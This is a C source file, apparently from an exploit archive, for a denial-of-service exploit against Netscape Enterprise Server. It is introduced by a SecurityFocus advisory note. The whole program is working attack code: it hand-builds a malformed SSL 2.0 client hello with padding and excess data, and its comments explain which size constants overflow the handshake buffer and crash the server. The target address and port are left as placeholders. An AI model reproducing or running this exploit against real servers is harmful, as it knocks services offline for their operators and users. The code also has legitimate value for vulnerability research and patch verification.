/*
source: http://www.securityfocus.com/bid/516/info

Netscape's Enterprise Server suffers from a buffer overflow error in the SSL handshaking code that causes it to crash when the buffer is overrun. 
*/

//
// nesexploit.c - v1.02 - by Arne Vidstrom, winnt@bahnhof.se
//
// This program crashes Netscape Enterprise Server when it is
// running in SSL mode, by exploiting a bug in the SSL handshake
// code. The server crashes if the client:
//
//  * starts with SSL 2.0 format
//  * uses long record header
//  * uses padding >= 8
//  * sends at least 11 bytes more data than it specifies in the
//    header
//  * sends at least about 4 kb data
//
// I haven't included any error handling in the code because it's
// so boring to write... ;o)
//

#include <winsock.h>
#include <string.h>
#include <stdio.h>

#define sockaddr_in struct sockaddr_in
#define sockaddr struct sockaddr

// Some combinations of these three constants will crash the server,
// others will not.

#define PADDING 8
#define SPECIFIED_SIZE 11822
#define ACTUAL_SIZE 11833

void main(void)
{
      // IP address of the server - set to your own server and nobody
      // elses :o)
      char ipaddr[25] = "xxx.xxx.xxx.xxx";

      // SSL port
      unsigned short port = xxxxx;

      SOCKET socket1;
      unsigned char s[65536];
      int errorCode;
      WSADATA winSockData;
      sockaddr_in peer;
      int result;
      unsigned char i;
      unsigned int l;
      int flags;

      printf("\nnesexploit.c - developed by Arne Vidstrom, winnt@bahnhof.se\n\n");

      // Allocate a socket, connect and stuff...
      errorCode = WSAStartup(0x0101, &winSockData);
      socket1 = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
      peer.sin_family = AF_INET;
      peer.sin_port = htons(port);
      peer.sin_addr.s_addr = inet_addr(ipaddr);
      for (i = 0; i < 8; i++)
              peer.sin_zero[i] = 0;
      result = connect(socket1, (sockaddr *) &peer, sizeof(peer));
      if (result != 0)
              printf("Ehmn, where's that server? ;o)\n\n");

      // Initialize the buffer with a lot of '.' Anything would do...
      for (l=0; l<65536; l++)
              s[l] = '.';

      // Version 2.0 Format Header with padding.
      // Shouldn't be any padding because this part is not encrypted,
      // but without padding the server won't crash. :o)
      s[0] = (SPECIFIED_SIZE & 0xff00) >> 8;
      s[1] = (SPECIFIED_SIZE & 0x00ff);
      s[2] = PADDING;

      // Client says Hello!
      s[3] = 0x01;

      // Client wishes to use Version 3.0 later (there will be no "later" though...)
      s[4] = 0x03;
      s[5] = 0x00;

      // Cipher Specs Length = 3
      s[6] = 0x00;
      s[7] = 0x0c;

      // Session ID = 0
      s[8] = 0x00;
      s[9] = 0x00;

      // Challenge Length = 16
      s[10] = 0x00;
      s[11] = 0x10;

      // Challenge Specs Data
      s[12] = 0x02;
      s[13] = 0x00;
      s[14] = 0x80;

      s[15] = 0x04;
      s[16] = 0x00;
      s[17] = 0x80;

      s[18] = 0x00;
      s[19] = 0x00;
      s[20] = 0x03;

      s[21] = 0x00;
      s[22] = 0x00;
      s[23] = 0x06;

      // Challenge Data is a few '.' from above

      // The rest is also '.' from above

      // Send all this to the server
      flags = 0;
      result = send(socket1, s, ACTUAL_SIZE, flags);
      if (result != SOCKET_ERROR)
              printf("Done!\n\n");

      // Clean up
      closesocket(socket1);
      WSACleanup();
}